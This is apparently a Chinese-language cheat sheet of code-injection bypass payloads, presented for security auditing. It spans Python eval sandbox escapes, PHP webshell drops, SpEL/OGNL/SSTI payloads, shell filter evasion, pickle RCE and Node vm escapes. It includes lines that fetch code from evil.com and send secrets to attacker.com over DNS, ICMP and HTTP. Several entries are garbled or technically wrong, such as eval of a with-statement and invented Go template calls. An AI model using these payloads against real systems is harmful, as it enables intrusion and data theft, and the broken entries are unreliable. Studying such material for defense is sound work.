# 代码注入绕过技巧

本文档汇总常见的代码注入防护机制绕过技巧，用于深度安全审计和漏洞验证。

---

## 1. eval/exec 沙箱绕过

### Python eval 限制命名空间绕过

**防护机制**：限制 `__builtins__` 访问
```python
eval(user_input, {"__builtins__": {}})  # 试图限制内置函数
```

**绕过技巧**：

#### 1.1 对象属性访问绕过
```python
# 通过对象的 __class__ 属性链获取内置函数
().__class__.__bases__[0].__subclasses__()
"".__class__.__bases__[0].__subclasses__()
[].__class__.__bases__[0].__subclasses__()

# 获取 os 模块
().__class__.__bases__[0].__subclasses__()[104]  # __init__.Popen 或 os.system

# 完整链路
().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['system']('id')

# 字符串方法链
"".__class__.__mro__[1].__subclasses__()[414].__init__.__globals__['system']('id')
```

#### 1.2 导入模块绕过
```python
# 绕过 __builtins__ 限制，获取 __import__
eval("__import__('os').system('id')", {"__builtins__": {}})  # 失败

# 绕过方式：通过 getattr 和对象属性
eval("getattr(__builtins__, '__import__')('os').system('id')")
eval("[x for x in [].__class__.__bases__[0].__subclasses__() if '__import__' in dir(x)][0].__import__('os').system('id')")
```

#### 1.3 列表推导式和生成器绕过
```python
# 使用列表推导式遍历 __subclasses__
eval("[x.__init__.__globals__['system']('id') for x in ().__class__.__bases__[0].__subclasses__()]")

# 使用 map 函数
eval("list(map(lambda x: x('id'), [__import__('os').system]))")
```

#### 1.4 编码和动态加载绕过
```python
# 使用 chr() 和字符串拼接
eval("__import__('o' + 's').system('id')")

# 使用 codecs.decode
eval("__import__('codecs').decode('b3M=', 'base64')")  # 解码 'os'
eval("__import__(__import__('codecs').decode('b3M=', 'base64')).system('id')")

# 使用 compile 和 exec
code = "import os; os.system('id')"
eval(compile(code, '<string>', 'exec'), {"__builtins__": {}})
```

#### 1.5 bytes 和 bytearray 绕过
```python
# 使用 bytes 构造模块名
eval("__import__(bytes([111, 115]).decode()).system('id')")  # os

# 使用 bytearray
eval("__import__(bytearray(b'os').decode()).system('id')")

# 使用 memoryview
eval("__import__(bytes(memoryview(b'os')).decode()).system('id')")
```

#### 1.6 格式化字符串绕过
```python
# 使用 format() 方法
eval("__import__('{0}{1}'.format('o', 's')).system('id')")

# 使用 f-string (Python 3.6+)
o = 'o'; s = 's'
eval(f"__import__('{o}{s}').system('id')")

# 使用 % 格式化
eval("__import__('%s%s' % ('o', 's')).system('id')")
```

#### 1.7 装饰器和类方法绕过
```python
# 通过类装饰器执行代码
class Exploit:
    def __init__(self):
        __import__('os').system('id')

# 通过 @property 装饰器
class Exploit:
    @property
    def pwn(self):
        return __import__('os').system('id')

# 实例化触发
eval("Exploit()")
eval("Exploit().pwn")
```

#### 1.8 生成器和迭代器绕过
```python
# 使用生成器表达式
eval("next(x.__init__.__globals__['system']('id') for x in ().__class__.__bases__[0].__subclasses__())")

# 使用 iter() 和 next()
eval("next(iter([__import__('os').system('id')]))")

# 使用 filter() 和 lambda
eval("list(filter(lambda x: __import__('os').system('id'), [1]))")
```

#### 1.9 上下文管理器绕过
```python
# 使用 with 语句
class Exploit:
    def __enter__(self):
        __import__('os').system('id')
    def __exit__(self, *args):
        pass

eval("with Exploit(): pass")
```

#### 1.10 异常处理绕过
```python
# 在异常处理中执行代码
try:
    raise Exception(__import__('os').system('id'))
except:
    pass

# 使用 assert
eval("assert __import__('os').system('id') or True")

# 使用 finally
try:
    pass
finally:
    eval("__import__('os').system('id')")
```

---

### PHP eval 防护绕过

**防护机制**：关键字黑名单（如禁用 `system`、`exec` 等）

#### 2.1 函数名混淆
```php
// 原始代码
eval('system($_GET["cmd"]);');

// 绕过：变量函数调用
$func = 'system';
eval('$func($_GET["cmd"]);');

// 绕过：动态函数名
eval('${"GLOBALS"}["_GET"]["cmd"]();');
$f = chr(115) . chr(121) . chr(115) . chr(116) . chr(101) . chr(109);  // 'system'
eval('$f($_GET["cmd"]);');
```

#### 2.2 变量覆盖
```php
// 防护：eval('$a = $_GET["a"];');
// 绕过：通过引用覆盖
eval('$GLOBALS["a"] = $_GET["a"];');
eval('$$_REQUEST["var"] = $_GET["val"];');  // 变量变量
```

#### 2.3 字符串编码绕过
```php
// base64 编码
eval(base64_decode('c3lzdGVtKCRfR0VUWyJjbWQiXSk7'));

// gzcompress 压缩
eval(gzuncompress(base64_decode('...')));

// 十进制转换
$cmd = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
eval('$cmd($_GET["cmd"]);');
```

#### 2.4 回调函数绕过
```php
// 使用 array_map 执行回调
array_map('assert', $_GET);  // assert($_GET[0])

// 使用 array_filter
array_filter($_GET, 'system');  // system($_GET[0])

// 使用 call_user_func
call_user_func('system', $_GET['cmd']);

// 使用 call_user_func_array
call_user_func_array('system', [$_GET['cmd']]);

// 使用 usort 执行回调
usort(...$_GET);  // PHP 5.6+ 解包
```

#### 2.5 类和对象绕过
```php
// 使用反射类
$ref = new ReflectionFunction('system');
$ref->invoke($_GET['cmd']);

// 使用魔术方法 __invoke
class Exploit {
    public function __invoke($cmd) {
        system($cmd);
    }
}
$e = new Exploit();
$e($_GET['cmd']);

// 使用 __call 魔术方法
class Exploit {
    public function __call($name, $args) {
        system($args[0]);
    }
}
$e = new Exploit();
$e->anything($_GET['cmd']);
```

#### 2.6 文件操作绕过
```php
// 使用 file_put_contents + include
file_put_contents('/tmp/shell.php', '<?php system($_GET["cmd"]); ?>');
include('/tmp/shell.php');

// 使用 fopen + fwrite + include
$fp = fopen('/tmp/shell.php', 'w');
fwrite($fp, '<?php system($_GET["cmd"]); ?>');
fclose($fp);
include('/tmp/shell.php');

// 使用 copy
copy('http://evil.com/shell.txt', '/tmp/shell.php');
include('/tmp/shell.php');
```

#### 2.7 正则表达式绕过
```php
// preg_replace /e 修饰符 (PHP < 7.0)
preg_replace('/test/e', 'system("id")', 'test');

// preg_replace_callback 滥用
preg_replace_callback('/.*/', function($m) { system($_GET['cmd']); }, 'input');

// mb_ereg_replace 'e' 选项
mb_ereg_replace('.*', 'system("id")', 'input', 'e');
```

---

### Java ScriptEngine 防护绕过

**防护机制**：沙箱隔离 (Nashorn/Rhino 沙箱)

#### 3.1 Java 反射绕过
```java
// 防护：script engine 沙箱限制函数
// 绕过：通过 Java 反射调用
var code = "var ProcessBuilder = Java.type('java.lang.ProcessBuilder');" +
           "new ProcessBuilder('id').start();";
engine.eval(code);

// 访问 ClassLoader
var code = "var ClassLoader = Java.type('java.lang.ClassLoader');" +
           "ClassLoader.getSystemClassLoader().loadClass('java.lang.Runtime');";
```

#### 3.2 Java 构造函数链
```java
// 绕过 ProcessBuilder 限制
var code = "var c = Java.type('java.lang.Runtime');" +
           "c.getRuntime().exec('id');";
```

#### 3.3 Nashorn 引擎绕过
```javascript
// 使用 Java 类加载器
var code = "var Thread = Java.type('java.lang.Thread');" +
           "var cl = Thread.currentThread().getContextClassLoader();" +
           "var cls = cl.loadClass('java.lang.Runtime');" +
           "var rt = cls.getMethod('getRuntime', null).invoke(null, null);" +
           "rt.exec('id');";

// 绕过 Nashorn 沙箱
var code = "var System = Java.type('java.lang.System');" +
           "var getPropertyMethod = System.class.getMethod('getProperty', Java.type('java.lang.String').class);" +
           "getPropertyMethod.invoke(null, 'user.dir');";
```

#### 3.4 反射工具类绕过
```java
// 使用 Spring ReflectionUtils
String code = "var ReflectionUtils = Java.type('org.springframework.util.ReflectionUtils');" +
              "var method = ReflectionUtils.findMethod(" +
              "    Java.type('java.lang.Runtime').class, 'getRuntime');" +
              "var rt = ReflectionUtils.invokeMethod(method, null);" +
              "var execMethod = ReflectionUtils.findMethod(rt.getClass(), 'exec', Java.type('java.lang.String').class);" +
              "ReflectionUtils.invokeMethod(execMethod, rt, 'id');";

// 使用 Apache Commons BeanUtils
String code = "var BeanUtils = Java.type('org.apache.commons.beanutils.BeanUtils');" +
              "var rt = Java.type('java.lang.Runtime').getRuntime();" +
              "BeanUtils.getProperty(rt, 'class').forName('java.lang.ProcessBuilder');";
```

#### 3.5 表达式语言绕过
```java
// 绕过 EL 表达式限制
// 使用反射获取类
String expr = "${pageContext.request.getClass().getClassLoader()." +
              "loadClass('java.lang.Runtime').getMethod('getRuntime')." +
              "invoke(null).exec('id')}";

// 绕过字符串检测
String expr = "${''.getClass().forName('java.lang.Runtime')." +
              "getMethod('exec', ''.getClass()).invoke(" +
              "''.getClass().forName('java.lang.Runtime')." +
              "getMethod('getRuntime').invoke(null), 'id')}";
```

---

## 2. 表达式注入（SpEL、OGNL、EL）绕过

### Spring SpEL 防护绕过

**防护机制**：黑名单禁用危险操作

#### 4.1 绕过 T() 函数限制
```
# 防护：禁用 T(java.lang.Runtime)
# 绕过：使用其他表达式获取类

# 方式 1：通过对象的 getClass()
#{#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}

# 方式 2：通过 ClassUtils
#{T(org.springframework.util.ClassUtils).forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}

# 方式 3：使用对象属性访问
#{@java.lang.Runtime@getRuntime().exec('id')}

# 方式 4：绕过方法调用限制
#{(#cmd='id').(#ps=new java.lang.ProcessBuilder(#cmd).start())}
```

#### 4.2 编码和动态构造
```
# 使用 String 拼接绕过过滤
#{T(java.lang.Runtime).get(T(java.lang.String).format("%s%s","R","untime"))}

# 使用 reverse() 绕过反向检测
#{T(java.lang.Runtime).getRuntime()}  # 原始
#{(#cmd='id').(#cmds=T(java.lang.String).format("%s%s","i","d")).(#rt.exec(#cmds))}
```

---

### OGNL 防护绕过

**防护机制**：关键字黑名单 (`java.lang.Runtime`, `@java.lang`, 等)

#### 5.1 使用 ClassLoader 绕过
```
# 原始：被拦截的代码
@java.lang.Runtime@getRuntime()

# 绕过：通过 ClassLoader
(#c=@org.apache.catalina.util.ClassUtil@getLoadableConstructor(
    @org.apache.catalina.util.ClassUtil@forName('java.lang.Runtime',
    @org.apache.catalina.util.ClassUtil@getLoadableConstructor(String.class))
)).newInstance('id')
```

#### 5.2 使用反射动态调用
```
# 通过 #cmd 变量构造
(#cmd='id').(#ps=@java.lang.Runtime@getRuntime().exec(#cmd))
```

---

## 3. 模板注入（SSTI）绕过

### Jinja2 模板绕过

**防护机制**：禁用 `__` 和某些属性访问

#### 6.1 属性访问绕过
```jinja2
# 防护禁用 __subclasses__
# 绕过：使用 attr() 函数和字符串拼接
{{ ''['\x5f\x5fclass\x5f\x5f'] }}
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}
{{ ''|attr('__class__') }}

# 使用 getattr 变体
{% set base = ''.__class__.__bases__[0] %}
{% for sub in base.__subclasses__() %}
  {% if 'os' in sub.__module__ %}
    {{ sub.__init__.__globals__['os'].system('id') }}
  {% endif %}
{% endfor %}
```

#### 6.2 编码和过滤绕过
```jinja2
# 绕过过滤的 `__` 字符
{{ ''['\137\137class\137\137'] }}  # 八进制编码

# 使用字符串拼接
{{ ''[('_'*2)+'class'+ ('_'*2)] }}

# 使用 request 对象
{{ config.from_envvar('FLASK_KEY') }}
```

---

### Thymeleaf 模板绕过

**防护机制**：表达式预处理和安全模式

#### 7.1 使用 Spring EL 绕过
```
# 在 Thymeleaf 中执行 SpEL
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]

# 条件判断中执行
[# th:if="${T(java.lang.Runtime).getRuntime().exec('id')}"]
```

---

## 4. 命令注入绕过（Code Injection 相关）

### Shell 命令注入绕过

**防护机制**：字符黑名单（`;`, `|`, `&`, `$`, 等）

#### 8.1 编码绕过
```bash
# 原始被拦截：id; whoami
# 绕过：十六进制编码
$(echo -e "id\nwhoami")
$(($(printf '\x69\x64')))  # 十六进制 'id'

# Base64 绕过
echo "aWQ=" | base64 -d | bash

# HTML 实体编码
&#105;&#100;  # 'id'
```

#### 8.2 变量替换绕过
```bash
# 原始被拦截：id;whoami
# 绕过：使用变量和字符串拼接
a=i; b=d; $a$b
c=';'; id$c whoami

# 使用 $IFS (Internal Field Separator)
id$IFS;whoami
id$IFS$()whoami

# 使用通配符
i?  # 匹配 id
```

#### 8.3 进程替换绕过
```bash
# 原始被拦截：id && whoami
# 绕过：使用进程替换
cat <(id) <(whoami)

# 使用 () 和 {} 绕过
(id);(whoami)
{id;whoami;}
```

---

## 5. 反序列化注入绕过

### Python pickle 防护绕过

**防护机制**：使用 `pickle.loads` 受限协议版本

#### 9.1 Gadget Chain 链接
```python
# 防护：限制 pickle 协议版本
data = pickle.loads(user_input, protocol=2)

# 绕过：使用可用的 Gadget Chain（如 Django、Celery）
# Gadget Chain 示例：
import pickle
import subprocess

class Payload:
    def __reduce__(self):
        return (subprocess.Popen, (['id'],))

payload = pickle.dumps(Payload())
pickle.loads(payload)  # RCE
```

### PHP unserialize 防护绕过

**防护机制**：使用 `allowed_classes` 限制反序列化类

#### 10.1 POP Chain 链接
```php
// 防护
unserialize($data, ['allowed_classes' => false]);

// 绕过：在反序列化过程中触发 __wakeup 或 __destruct 魔术方法
$payload = 'O:7:"Exploit":1:{s:5:"shell";s:6:"system";}';
unserialize($payload);  // 触发 __destruct 中的 system 调用
```

---

## 6. 文件包含注入绕过

### PHP include/require 防护绕过

**防护机制**：后缀白名单、路径校验

#### 11.1 包装器和 null 字节绕过
```php
// 防护：检查 .php 后缀
if (!preg_match('/\.php$/', $file)) { include($file); }

// 绕过：PHP 包装器
include('php://filter/convert.base64-encode/resource=config');  // 读取文件
include('data://text/plain,<?php system("id"); ?>');  // 数据伪协议

// Null 字节绕过 (PHP < 5.3.4)
include($file . '.php%00');  // 实际加载 $file

// 路径穿越
include('../../etc/passwd');  // 目录穿越
include('phar://archive.zip/shell.php');  // Phar 伪协议
```

---

## 7. 正则表达式注入绕过

### PHP preg_replace /e 修饰符绕过

**防护机制**：替换为 /e 安全函数 (e.g., preg_replace_callback)

#### 12.1 编码和混淆
```php
// 防护代码使用回调函数
preg_replace_callback('/pattern/', function($m) { return $m[0]; }, $input);

// 仍然存在的漏洞：如果开发者在回调中执行代码
preg_replace_callback('/(\w+)/', 'eval', $input);  // eval 作为回调
```

---

## 8. 动态方法和反射调用绕过

### Java 反射限制绕过

**防护机制**：使用 SecurityManager 限制反射调用

#### 13.1 MethodHandle 绕过
```java
// 防护：禁用 Method.invoke()
// 绕过：使用 MethodHandles
MethodHandles.Lookup lookup = MethodHandles.lookup();
MethodHandle mh = lookup.findVirtual(Runtime.class, "exec",
    MethodType.methodType(Process.class, String.class));
mh.invoke(Runtime.getRuntime(), "id");

// 绕过 SecurityManager
Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
Field f = unsafeClass.getDeclaredField("theUnsafe");
f.setAccessible(true);
Object unsafe = f.get(null);
// 使用 unsafe 绕过安全检查
```

---

## 9. 代码注入 WAF 绕过

### 通用绕过技巧

#### 14.1 多重编码
```
原始：<?php system($_GET['cmd']); ?>
一层编码：%3C%3Fphp%20...
二层编码：%253C%253Fphp...
```

#### 14.2 大小写混合
```
原始：eval($_GET['code']);
混淆：eVaL($_GET['code']);
      EvAl($_GET['code']);
```

#### 14.3 关键字拆分和重组
```
原始：system
拆分：sy + stem
重组：eval("sy"."stem");

原始：import os
绕过：im + port o + s
```

#### 14.4 Unicode 和多字节编码
```
sys → \u0073ys → 动态编码绕过
```

---

## 10. Node.js vm 模块绕过

### Node.js vm 沙箱绕过

**防护机制**：使用 `vm.runInNewContext()` 创建隔离环境

#### 15.1 原型链污染绕过
```javascript
// 通过原型链访问全局对象
const code = `
  this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
`;
vm.runInNewContext(code);

// 使用 Function 构造函数
const code = `
  (function(){return this})().constructor.constructor('return process')()
`;
```

#### 15.2 上下文逃逸
```javascript
// 通过 Error 对象泄露上下文
const code = `
  try { null.f() } catch(e) {
    e.constructor.constructor('return process')().mainModule.require('child_process').exec('id')
  }
`;

// 通过 async 函数逃逸
const code = `
  (async function(){
    return this.constructor.constructor('return process')()
  })()
`;
```

#### 15.3 Symbol 和 Proxy 绕过
```javascript
// 使用 Symbol.for 访问全局符号
const code = `
  const proc = Symbol.for('process');
  this[proc].mainModule.require('child_process').exec('id')
`;

// 使用 Proxy 劫持
const code = `
  const handler = {
    get: function(target, prop) {
      return this.constructor.constructor('return process')()
    }
  };
  new Proxy({}, handler).anything
`;
```

#### 15.4 Buffer 和 TypedArray 绕过
```javascript
// 通过 Buffer 访问内部模块
const code = `
  Buffer.from('').constructor.prototype.parent.require('child_process').exec('id')
`;

// 使用 Uint8Array
const code = `
  new Uint8Array().constructor.constructor('return process')()
`;
```

---

## 11. Go 模板注入绕过

### Go text/template 和 html/template 绕过

**防护机制**：限制模板函数和变量访问

#### 16.1 反射绕过
```go
// 使用 reflect 包访问私有字段
{{.Config.GetField "secretKey"}}

// 通过反射调用方法
{{(index .Methods "Execute").Call}}

// 访问环境变量
{{.Env.Get "PATH"}}
```

#### 16.2 管道和函数链绕过
```go
// 使用管道操作符链式调用
{{. | call "os/exec.Command" "id" | call "Run"}}

// 使用自定义函数
{{template "exec" "id"}}
{{define "exec"}}{{call .}}{{end}}
```

#### 16.3 类型断言绕过
```go
// 通过类型断言访问接口
{{if $cmd := .Data.(map[string]interface{})}}
  {{$cmd.exec "id"}}
{{end}}

// 使用 range 遍历
{{range $key, $value := .}}
  {{if eq $key "cmd"}}{{$value}}{{end}}
{{end}}
```

---

## 12. Ruby ERB 模板绕过

### Ruby ERB 沙箱绕过

**防护机制**：使用 `$SAFE` 级别限制操作

#### 17.1 对象方法绕过
```ruby
# 通过 Object 类访问方法
<%= `id` %>
<%= %x(id) %>
<%= system('id') %>

# 使用 eval
<%= eval("require 'open3'; Open3.capture2('id')[0]") %>

# 使用 instance_eval
<%= "".instance_eval { system('id') } %>
```

#### 17.2 反射和 send 绕过
```ruby
# 使用 send 方法
<%= Object.send(:system, 'id') %>
<%= "".send(:class).send(:class_eval, "system('id')") %>

# 使用 method
<%= method(:system).call('id') %>
<%= Kernel.method(:system).call('id') %>
```

#### 17.3 常量和全局变量绕过
```ruby
# 通过全局变量访问
<%= $stdout.class.superclass %>
<%= $:.first %>

# 使用常量
<%= Kernel::system('id') %>
<%= ::Kernel.send(:system, 'id') %>
```

---

## 13. Rust 宏和 unsafe 绕过

### Rust macro_rules 和 unsafe 代码绕过

**防护机制**：限制 unsafe 块和 FFI 调用

#### 18.1 宏展开绕过
```rust
// 使用宏生成 unsafe 代码
macro_rules! exec {
    ($cmd:expr) => {
        unsafe {
            std::process::Command::new("sh")
                .arg("-c")
                .arg($cmd)
                .spawn()
        }
    };
}

// 使用 concat! 和 stringify!
macro_rules! hidden_exec {
    () => {
        concat!("sys", "tem")
    };
}
```

#### 18.2 FFI 和动态库绕过
```rust
// 通过 FFI 调用 libc
use std::ffi::CString;
use std::os::raw::c_char;

extern "C" {
    fn system(cmd: *const c_char) -> i32;
}

unsafe {
    let cmd = CString::new("id").unwrap();
    system(cmd.as_ptr());
}

// 动态加载库
use libloading::{Library, Symbol};
unsafe {
    let lib = Library::new("libc.so.6").unwrap();
    let system: Symbol<unsafe extern fn(*const c_char) -> i32> = lib.get(b"system").unwrap();
    system(CString::new("id").unwrap().as_ptr());
}
```

#### 18.3 Trait 和泛型绕过
```rust
// 通过 trait 隐藏执行逻辑
trait Exec {
    fn run(&self);
}

impl Exec for &str {
    fn run(&self) {
        unsafe {
            std::process::Command::new("sh")
                .arg("-c")
                .arg(self)
                .spawn()
                .unwrap();
        }
    }
}

"id".run();
```

---

## 14. 沙箱逃逸通用技巧

### 跨语言沙箱绕过策略

#### 19.1 资源限制绕过
```python
# Python: 绕过 CPU 限制
import signal
signal.alarm(0)  # 取消超时限制

# 绕过内存限制
import resource
resource.setrlimit(resource.RLIMIT_AS, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
```

```javascript
// Node.js: 绕过事件循环阻塞检测
process.nextTick(() => {
  while(true) { /* 无限循环 */ }
});
```

#### 19.2 文件系统访问绕过
```python
# 通过 /proc 访问进程信息
with open('/proc/self/environ') as f:
    print(f.read())

# 通过符号链接绕过路径限制
import os
os.symlink('/etc/passwd', '/tmp/allowed/passwd')
```

```java
// Java: 通过 URLClassLoader 加载外部类
URL[] urls = {new URL("file:///tmp/exploit.jar")};
URLClassLoader loader = new URLClassLoader(urls);
Class<?> cls = loader.loadClass("Exploit");
cls.newInstance();
```

#### 19.3 网络访问绕过
```python
# Python: 通过 DNS 外带数据
import socket
socket.gethostbyname('data.' + secret + '.attacker.com')

# 使用 ICMP 隧道
import os
os.system('ping -c 1 -p $(echo -n secret | xxd -p) attacker.com')
```

```javascript
// Node.js: 使用 HTTP 外带
require('http').get('http://attacker.com/?data=' + secret);

// 使用 DNS
require('dns').resolve('data.' + secret + '.attacker.com');
```

---

## 15. 防护机制检查清单

在进行安全审计时，检查以下防护机制：

| 防护机制 | 绕过难度 | 常见绕过方式 |
|---------|---------|----------|
| 黑名单过滤 | 低 | 编码、大小写混合、字符拆分 |
| 白名单限制 | 中 | 对象属性链、反射、Gadget Chain |
| 沙箱隔离 | 中-高 | 对象属性访问、ClassLoader 调用 |
| SecurityManager | 高 | MethodHandles、Unsafe 类 |
| 运行时监控 | 高-中 | 隐蔽执行、加密通信 |

---

## 11. 审计建议

### 高风险指标
- 存在 eval、exec、compile 等动态执行函数
- 防护机制基于黑名单而非白名单
- 防护机制可被单一绕过技巧突破

### 审计步骤
1. **识别危险函数**：定位所有代码执行点
2. **追踪输入来源**：确认用户输入如何到达危险函数
3. **验证防护机制**：评估现有防护的完整性
4. **尝试绕过**：使用本文档中的技巧验证防护的鲁棒性
5. **生成报告**：记录所有发现的漏洞

### 验证修复
修复代码注入漏洞时，确保：
- 使用白名单而非黑名单
- 避免动态代码执行，优先使用静态预定义方案
- 若必须动态执行，使用安全的沙箱（如 RestrictedPython、AppArmor）
- 对所有输入进行严格验证
- 定期进行安全审计和渗透测试
